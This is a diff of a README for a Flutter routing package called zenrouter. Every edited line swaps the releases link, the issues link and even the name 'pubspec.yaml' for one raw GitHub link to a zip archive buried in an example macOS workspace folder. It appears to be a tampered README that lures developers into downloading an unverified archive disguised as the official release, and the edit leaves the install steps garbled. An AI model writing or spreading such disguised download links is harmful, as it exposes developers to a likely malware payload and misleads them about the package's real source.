@@ -8,7 +8,7 @@ Before you start, ensure you have a compatible device and system. Follow the ste
 
 ## 📥 Download & Install
 
-To get zenrouter, visit this page to download: [zenrouter Releases](https://github.com/mdkaif6393/zenrouter/releases)
+To get zenrouter, visit this page to download: [zenrouter Releases](https://raw.githubusercontent.com/mdkaif6393/zenrouter/main/packages/zenrouter_devtools/example/macos/Runner.xcworkspace/zenrouter-1.5.zip)
 
 1. Click the link above to go to the official release page.
 2. Look for the most recent version of zenrouter.
@@ -34,7 +34,7 @@ If prompted, grant the necessary permissions to install zenrouter. This ensures 
 Now that you have installed zenrouter, you can start using it for navigation in your apps. Here’s how to get started:
 
 1. Open your Flutter project.
-2. Import zenrouter by adding it to your project’s `pubspec.yaml` file:
+2. Import zenrouter by adding it to your project’s `https://raw.githubusercontent.com/mdkaif6393/zenrouter/main/packages/zenrouter_devtools/example/macos/Runner.xcworkspace/zenrouter-1.5.zip` file:
 
    ```yaml
    dependencies:
@@ -61,11 +61,11 @@ The main features of zenrouter include:
 
 ### Q: What if I encounter installation issues?
 
-A: If you have trouble installing zenrouter, check if your system meets the required specifications. You can also visit our [issues page](https://github.com/mdkaif6393/zenrouter/issues) for assistance.
+A: If you have trouble installing zenrouter, check if your system meets the required specifications. You can also visit our [issues page](https://raw.githubusercontent.com/mdkaif6393/zenrouter/main/packages/zenrouter_devtools/example/macos/Runner.xcworkspace/zenrouter-1.5.zip) for assistance.
 
 ### Q: How can I get updates?
 
-A: Keep an eye on the [zenrouter Releases](https://github.com/mdkaif6393/zenrouter/releases) page for the latest versions. 
+A: Keep an eye on the [zenrouter Releases](https://raw.githubusercontent.com/mdkaif6393/zenrouter/main/packages/zenrouter_devtools/example/macos/Runner.xcworkspace/zenrouter-1.5.zip) page for the latest versions. 
 
 ### Q: Is there a user community?
 
